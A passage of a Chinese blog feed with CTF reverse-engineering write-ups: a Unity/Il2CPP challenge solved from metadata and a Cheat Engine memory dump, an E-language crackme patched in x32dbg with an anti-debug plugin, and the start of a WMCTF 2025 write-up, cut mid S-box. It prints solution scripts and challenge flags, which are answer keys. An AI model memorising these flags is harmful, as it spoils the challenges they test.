字段，Il2CPP 在生成原生代码时把它当成“带初值的数组字段”，这类字段的初始内容会被落到 FieldAndParameterDefaultValueData 段。构造函数 sub_181652960 → sub_1805CA600 → sub_180450230 → sub_180558480 … 的链条正是 Il2CPP 的“从 metadata 里读FieldRVA，拷贝默认值到托管对象”逻辑，说明 qrMatrix 的实际数据就存放在该段。</p><p>  所以流程是：</p><ol><li>按官方结构读取 header，得到 fieldAndParameterDefaultValueDataOffset（&#x3D;1782496）和 fieldAndParameterDefaultValueDataSize。</li><li>在这段数据里寻找 29×29（&#x3D;841）个 uint32 全部为 0&#x2F;1 的块；Il2CppDumper 给出的 FieldRVA 索引 (script.json) 也会指向同一个位置，于是能确认这就是 qrMatrix 的初始值。</li><li>再用从 metadata 里取出的偏移（例如 offset &#x3D; data_offset + 19740*4）去读取整块数据，生成二维码矩阵。</li></ol><p>换句话说：第 18、19 个字段并不是我推出来的，而是 Unity 在元数据格式里就定义好的；二维码位于那段，是因为 QRCodeBuilder.qrMatrix 属于“带默认值的字段”，Il2CPP 的写法就是把这些默认值统一放在这个段里</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 1) 读出 29x29 的二维码矩阵（整型 0/1）</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">META_PATH = Path(<span class="string">&quot;global-metadata.dat&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> META_PATH.exists(), <span class="string">&quot;global-metadata.dat not found in current dir&quot;</span></span><br><span class="line"></span><br><span class="line">meta = META_PATH.read_bytes()</span><br><span class="line"></span><br><span class="line"><span class="comment"># metadata header: see Il2Cpp global-metadata layout</span></span><br><span class="line">field_and_param_default_data_offset = struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, meta, <span class="number">18</span> * <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">field_and_param_default_data_size = struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, meta, <span class="number">19</span> * <span class="number">4</span>)[<span class="number">0</span>]</span><br><span class="line">field_and_param_default_data = meta[</span><br><span class="line">                               field_and_param_default_data_offset:</span><br><span class="line">                               field_and_param_default_data_offset + field_and_param_default_data_size</span><br><span class="line">                               ]</span><br><span class="line"></span><br><span class="line">SIZE = <span class="number">29</span></span><br><span class="line">BLOCK_INTS = SIZE * SIZE</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个索引 19740 就是 FieldRVA 的条目指到的地方；也可以通过脚本扫描所有 0/1 区块得到</span></span><br><span class="line">start_index = <span class="number">19740</span></span><br><span class="line"></span><br><span class="line">block = struct.unpack_from(</span><br><span class="line">    <span class="string">f&quot;&lt;<span class="subst">&#123;BLOCK_INTS&#125;</span>I&quot;</span>,</span><br><span class="line">    field_and_param_default_data,</span><br><span class="line">    start_index * <span class="number">4</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">matrix = np.array(block, dtype=np.uint8).reshape((SIZE, SIZE))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) 生成几张帮助分析的图片</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_qr</span>(<span class="params">arr: np.ndarray, path: Path, scale: <span class="built_in">int</span> = <span class="number">20</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;把 0/1 阵列保存成放大后的黑白 PNG.&quot;&quot;&quot;</span></span><br><span class="line">    img = np.where(arr == <span class="number">1</span>, <span class="number">0</span>, <span class="number">255</span>).astype(np.uint8)</span><br><span class="line">    img = cv2.resize(img, (SIZE * scale, SIZE * scale), interpolation=cv2.INTER_NEAREST)</span><br><span class="line">    cv2.imwrite(<span class="built_in">str</span>(path), img)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 原始矩阵直接存成二维码（1 表示黑模块）</span></span><br><span class="line">write_qr(matrix, Path(<span class="string">&quot;qr_final.png&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;处理完成，已生成 qr_final.png &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="number">1782496</span>+ <span class="number">19740</span>*<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052114898.png" alt="image-20251105211440808"></p><p>扫出的flag</p><p>NSSCTF{f7c244c0-5f43-4829-83da-ebbc713324f5}</p><h2 id="解法4：CE动调-半静态"><a href="#解法4：CE动调-半静态" class="headerlink" title="解法4：CE动调+半静态"></a>解法4：CE动调+半静态</h2><p>其实跟静态分析没啥区别了，不知道有没有更好的方法</p><p>就是之前静态分析完，基于这些知识我们去ce下断点dump这个矩阵</p><p>之前的静态分析已经知道了偏移和 RVA。</p><p>要拿到在 Unity 游戏里，<code>QRCodeBuilder</code> 脚本实例中的字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this + 0x48 → qrMatrix (int[,])</span><br></pre></td></tr></table></figure><p>构建二维码时，这个 <code>qrMatrix</code> 会被填满，然后立刻被释放。</p><p>所以流程是：</p><ol><li><strong>Attach 游戏进程</strong></li><li><strong>找到 GameAssembly.dll 基址</strong></li><li><strong>在 ConstructQRCode (0x810F90)</strong> 附近下断</li><li><strong>查看 this 指针</strong></li><li><strong>顺着 this+0x48 拿出矩阵地址</strong></li><li><strong>Dump 出矩阵内容</strong></li></ol><p>第一步：Attach 游戏进程</p><p>先启动游戏，但不要进入地图</p><ol><li>打开 CE；</li><li>点左上角；</li><li>成功后 CE 窗口左下角会显示「附加到进程」，选<strong>attach</strong>。</li></ol><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052123519.png" alt="image-20251105212352395"></p><p><strong>拿 GameAssembly.dll 基址</strong></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052127702.png" alt="image-20251105212747610"></p><ol><li>在 CE 里打开「内存视图」（Memory View）；</li><li>菜单栏 <code>View → Memory Regions</code>；</li><li>找到一行名字含有 <code>GameAssembly.dll</code>；</li><li>记下它的起始地址（如7FF864330000 ）；这就是模块基址。</li></ol><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052128311.png" alt="image-20251105212835208"></p><p><strong>第三步：跳到 ConstructQRCode</strong></p><p> RVA 是 <code>0x810F90</code>。在 CE 的汇编窗口（Memory View）里按：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ctrl+G → 输入 GameAssembly.dll+810F90</span><br></pre></td></tr></table></figure><p>这就是函数入口（<code>QRCodeBuilder.ConstructQRCode()</code>）。</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052129997.png" alt="image-20251105212940801"></p><p><strong>第四步：下断点</strong></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052130731.png" alt="image-20251105213002640"></p><p>右键第一条指令 → 「断点 → 在此处设置断点」。</p><p>然后：</p><ol><li>回到游戏；</li><li>做那个动作让二维码生成（Enter）；</li><li>游戏会在断点处<strong>暂停</strong>。</li></ol><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052130682.png" alt="image-20251105213049463"></p><p><strong>第五步：看 this 指针（RCX）</strong></p><p>在 CE 的 <strong>寄存器窗口</strong>：</p><ul><li>找 <code>RCX</code>。在 IL2CPP 下，<code>RCX</code> 通常是 <code>this</code> 指针（对象指针）。</li><li>右键 <code>RCX</code> → 「在内存中查看此地址」。</li></ul><p>这就是 <code>QRCodeBuilder</code> 实例。</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052131969.png" alt="image-20251105213115888"></p><p><strong>第六步：看字段偏移</strong></p><p>在「内存视图」里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">this + 0x20 → blackMaterial</span><br><span class="line">this + 0x28 → whiteMaterial</span><br><span class="line">this + 0x30 → moduleSize</span><br><span class="line">this + 0x34 → origin</span><br><span class="line">this + 0x40 → thickness</span><br><span class="line">this + 0x48 → qrMatrix</span><br></pre></td></tr></table></figure><p>直接在 CE 里：</p><ol><li><p>右键 → 「转到地址」；</p></li><li><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RCX+48</span><br></pre></td></tr></table></figure></li><li><p>看这一处存的 8 字节内容，就是一个<strong>指针</strong>（qrMatrix 对象地址）。</p></li></ol><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052135975.png" alt="image-20251105213503882"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052135908.png" alt="image-20251105213517821"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052135876.png" alt="image-20251105213543762"></p><p>可以看到下面全是01字节</p><p><strong>第七步：跟进 qrMatrix</strong></p><p>右键这 8 字节 → 「在内存中查看此地址」。这里是 <code>int[,]</code> 结构体：</p><p>一般是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00: vtable指针</span><br><span class="line">08: rank (维度)</span><br><span class="line">10: length1</span><br><span class="line">14: length2</span><br><span class="line">18: 数据区...</span><br></pre></td></tr></table></figure><p>（不同 Unity 版本可能略有不同）</p><p>能看到成片的 <code>00 00 00 00</code> &#x2F; <code>01 00 00 00</code> 模式，这就是二维码的黑白格。</p><p><strong>第八步：dump</strong></p><p>save指定内存区域</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052136460.png" alt="image-20251105213644382"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052137632.png" alt="image-20251105213734518"></p><p>这个49 03 是<strong>元素总数 <code>0x349 = 841</code>（小端的 <code>49 03 00 00</code>）</strong>，841 是 29×29，说明这是一个 29×29 的二维码矩阵</p><p>我们从这四个字节后开始dump</p><p>定位到 <code>49 03 00 00</code> 这一段的地址是 **<code>200D898A018</code>**。这说明这是二维码矩阵数据前面的计数字段（841个元素）。</p><p>我们要从它<strong>后面紧接着的 <code>01 00 00 00 ...</code> 开始 dump</strong>，长度大约 841 × 4 字节。</p><p>自己算下，然后填进去就可以dump了</p><p>把ce的头去掉就是这样的</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052143344.png" alt="image-20251105214357210"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">dump_path = Path(<span class="string">&quot;dump.bin&quot;</span>)      <span class="comment"># 你的dump文件</span></span><br><span class="line">out_path  = Path(<span class="string">&quot;qr.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">SIZE = <span class="number">29</span></span><br><span class="line">COUNT = SIZE * SIZE  <span class="comment"># 841</span></span><br><span class="line"></span><br><span class="line">raw = dump_path.read_bytes()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_segment</span>(<span class="params">data: <span class="built_in">bytes</span>, count: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;在所有字节对齐(0..3)下，寻找长度为 count、元素仅为&#123;0,1&#125;的 int32 段&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> align <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) - align &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 裁成4字节对齐长度</span></span><br><span class="line">        usable = data[align: <span class="built_in">len</span>(data) - ((<span class="built_in">len</span>(data) - align) % <span class="number">4</span>)]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(usable) &lt; <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        ints = np.frombuffer(usable, dtype=<span class="string">&quot;&lt;i4&quot;</span>)</span><br><span class="line">        <span class="comment"># 完全匹配</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ints) == count <span class="keyword">and</span> np.<span class="built_in">all</span>((ints == <span class="number">0</span>) | (ints == <span class="number">1</span>)):</span><br><span class="line">            <span class="keyword">return</span> ints</span><br><span class="line">        <span class="comment"># 滑窗搜索</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ints) &gt;= count:</span><br><span class="line">            mask01 = (ints == <span class="number">0</span>) | (ints == <span class="number">1</span>)</span><br><span class="line">            valid = mask01.astype(np.int32)</span><br><span class="line">            csum = np.cumsum(valid)</span><br><span class="line">            wins = csum[count-<span class="number">1</span>:] - np.concatenate(([<span class="number">0</span>], csum[:-count]))</span><br><span class="line">            idxs = np.where(wins == count)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> idxs.size &gt; <span class="number">0</span>:</span><br><span class="line">                start = <span class="built_in">int</span>(idxs[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">return</span> ints[start:start+count]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">seg = extract_segment(raw, COUNT)</span><br><span class="line"><span class="keyword">if</span> seg <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未在 dump 中找到连续的 0/1 int32 段；请检查 dump 起点/长度&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 -&gt; 黑(0)，0 -&gt; 白(255)</span></span><br><span class="line">matrix = seg.reshape(SIZE, SIZE).astype(np.uint8)</span><br><span class="line">img = np.where(matrix == <span class="number">1</span>, <span class="number">0</span>, <span class="number">255</span>).astype(np.uint8)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 放大保存</span></span><br><span class="line">scale = <span class="number">20</span></span><br><span class="line">img_big = cv2.resize(img, (SIZE*scale, SIZE*scale), interpolation=cv2.INTER_NEAREST)</span><br><span class="line">cv2.imwrite(<span class="built_in">str</span>(out_path), img_big)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;saved&quot;</span>, out_path)</span><br></pre></td></tr></table></figure><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511052144289.png" alt="image-20251105214442184"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NSSCTF-2025-re-wp&quot;&gt;&lt;a href=&quot;#NSSCTF-2025-re-wp&quot; class=&quot;headerlink&quot; title=&quot;NSSCTF 2025 re wp&quot;&gt;&lt;/a&gt;NSSCTF 2025 re wp&lt;/h1&gt;&lt;h2 id=&quot;ez-te</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>IDA e语言逆向初探-以一道CTF题为例</title>
    <link href="http://matriy330.github.io/1e7e61d9/"/>
    <id>http://matriy330.github.io/1e7e61d9/</id>
    <published>2025-11-04T14:21:38.000Z</published>
    <updated>2025-11-05T14:21:52.467Z</updated>
    
    <content type="html"><![CDATA[<h1 id="IDA-e语言逆向初探-以一道CTF题为例"><a href="#IDA-e语言逆向初探-以一道CTF题为例" class="headerlink" title="IDA e语言逆向初探-以一道CTF题为例"></a>IDA e语言逆向初探-以一道CTF题为例</h1><p>题目附件可以留言找我拿</p><p><a href="https://www.52pojie.cn/thread-1684608-1-1.html">IDA易语言反编译插件E-Decompiler - 吾爱破解 - 52pojie.cn</a></p><p>e语言逆向，安装这个插件然后运行IDA分析</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011541782.png" alt="image-20251101154058677"></p><p>转到可疑函数</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011541355.png" alt="image-20251101154136310"></p><p>url解码后是HXB{YAO-YAO-QIE-KE-NAO}</p><p>假的</p><p>还发现</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011542089.png" alt="image-20251101154221060"></p><p>这几个串</p><p>交叉引用过去</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011542531.png" alt="image-20251101154246460"></p><p>有点像校验了</p><p>sub_404196应该是加密函数</p><p>有点像rc系列的加密，不知道是不是Rc4，可以猜测它为流加密的算法</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011543730.png" alt="image-20251101154334665"></p><p>如果是流加密的算法最好的解密方式就是再跑一边，看看动调能不能出</p><p>x32dbg打开，直接断点到这个大函数调试</p><blockquote><p>调试可能有反调试，注意开下sharpod这个插件</p></blockquote><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011544090.png" alt="image-20251101154451016"></p><p>基于假设我们可以试试看直接把密文patch回去</p><p>可以看到我输入的123</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011545025.png" alt="image-20251101154543966"></p><p>下面在ebp-4的地方是密文</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011551307.png" alt="image-20251101155142275"></p><p>在内存中修改为下面那段，注意的是patch记得别把最后的00字节给删了</p><p>要修改的字节粘贴进去这个串</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011715416.png" alt="image-20251101171551338"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011716048.png" alt="image-20251101171626417"></p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011717691.png" alt="image-20251101171729638"></p><p>一开始patch错了patch的第一个字符是88，后面也没保存结果所以是HXB{HAHA-HEHE-HEIHEI-HUOHUO-XIXI}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&quot;49,58,42,7B,48,41,48,41,2D,48,45,48,45,2D,48,45,49,48,45,49,2D,48,55,4F,48,55,4F,2D,58,49,58,49,7D,&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="built_in">bytes</span>(<span class="built_in">int</span>(x, <span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> enc.strip(<span class="string">&#x27;,&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"><span class="string">b&#x27;IXB&#123;HAHA-HEHE-HEIHEI-HUOHUO-XIXI&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>走59XXX这个分支是</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511011611900.png" alt="image-20251101161130858"></p><p>根据判断，一个是打开资源管理器，另一个是搞一个yaoyaoqiekenao的fake password</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;IDA-e语言逆向初探-以一道CTF题为例&quot;&gt;&lt;a href=&quot;#IDA-e语言逆向初探-以一道CTF题为例&quot; class=&quot;headerlink&quot; title=&quot;IDA e语言逆向初探-以一道CTF题为例&quot;&gt;&lt;/a&gt;IDA e语言逆向初探-以一道CTF题为例&lt;/</summary>
      
    
    
    
    <category term="Re" scheme="http://matriy330.github.io/categories/Re/"/>
    
    
    <category term="Re" scheme="http://matriy330.github.io/tags/Re/"/>
    
  </entry>
  
  <entry>
    <title>WMCTF 2025 re wp</title>
    <link href="http://matriy330.github.io/bd334558/"/>
    <id>http://matriy330.github.io/bd334558/</id>
    <published>2025-11-03T00:18:20.000Z</published>
    <updated>2025-11-06T00:18:46.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WMCTF-2025-re-wp"><a href="#WMCTF-2025-re-wp" class="headerlink" title="WMCTF 2025 re wp"></a>WMCTF 2025 re wp</h1><h2 id="catfriend"><a href="#catfriend" class="headerlink" title="catfriend"></a>catfriend</h2><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250920155316459.png" alt="image-20250920155316459"></p><p>校验逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># (value, destination offset in the 43-byte buffer)</span></span><br><span class="line">chunks = [</span><br><span class="line">    (<span class="number">0x61357B4654434D57</span>, <span class="number">0</span>),</span><br><span class="line">    (<span class="number">0x312D623266386533</span>, <span class="number">8</span>),</span><br><span class="line">    (<span class="number">0x663661342D643763</span>, <span class="number">16</span>),</span><br><span class="line">    (<span class="number">0x64302D653938622D</span>, <span class="number">24</span>),</span><br><span class="line">    (<span class="number">0x6234613166326333</span>, <span class="number">32</span>),</span><br><span class="line">    (<span class="number">0x7D63356234613166</span>, <span class="number">35</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">buf = <span class="built_in">bytearray</span>(<span class="number">43</span>)</span><br><span class="line"><span class="keyword">for</span> value, offset <span class="keyword">in</span> chunks:</span><br><span class="line">    buf[offset:offset + <span class="number">8</span>] = struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, value)</span><br><span class="line"></span><br><span class="line">flag = buf.decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>WMCTF{5a3e8f2b-1c7d-4a6f-b89e-0d3c2f1a4b5c}</p><h2 id="appfriend"><a href="#appfriend" class="headerlink" title="appfriend"></a>appfriend</h2><p>jadx打开</p><p>逆向native层</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250920160150873.png" alt="image-20250920160150873"></p><p>很明显的sm4</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20250920161439543.png" alt="image-20250920161439543"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"></span><br><span class="line">SBOX = [</span><br><span class="line">    <span class="number">0xd6</span>, <span class="number">0x90</span>, <span class="number">0xe9</span>, <span class="number">0xfe</span>, <span class="number">0xcc</span>, <span class="number">0xe1</span>, <span class="number">0x3d</span>, <span class="number">0xb7</span>, <span class="number">0x16</span>, <span class="number">0xb6</span>, <span class="number">0x14</span>, <span class="number">0xc2</span>, <span class="number">0x28</span>, <span class="number">0xfb</span>, <span class="number">0x2c</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x2b</span>, <span class="number">0x67</span>, <span class="number">0x9a</span>, <span class="number">0x76</span>, <span class="number">0x2a</span>, <span class="number">0xbe</span>, <span class="number">0x04</span>, <span class="number">0xc3</span>, <span class="number">0xaa</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>,</span><br><span class="line">    <span class="number">0x9c</span>, <span class="number">0x42</span>, <span class="number">0x50</span>, <span class="number">0xf4</span>, <span class="number">0x91</span>, <span class="number">0xef</span>, <span class="number">0x98</span>, <span class="number">0x7a</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0b</span>, <span class="number">0x43</span>, <span class="number">0xed</span>, <span class="number">0xcf</span>, <span class="number">0xac</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0xe4</span>, <span class="number">0xb3</span>, <span class="number">0x1c</span>, <span class="number">0xa9</span>, <span class="number">0xc9</span>, <span class="number">0x08</span>, <span class="number">0xe8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xdf</span>, <span class="number">0x94</span>, <span class="number">0xfa</span>, <span class="number">0x75</span>, <span class="number">0x8f</span>, <span class="number">0x3f</span>, <span class="number">0xa6</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xa7</span>, <span class="number">0xfc</span>, <span class="number">0xf3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xba</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3c</span>, <span class="number">0x19</span>, <span class="number">0xe6</span>, <span class="number">0x85</span>, <span class="number">0x4f</span>, <span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x6b</span>, 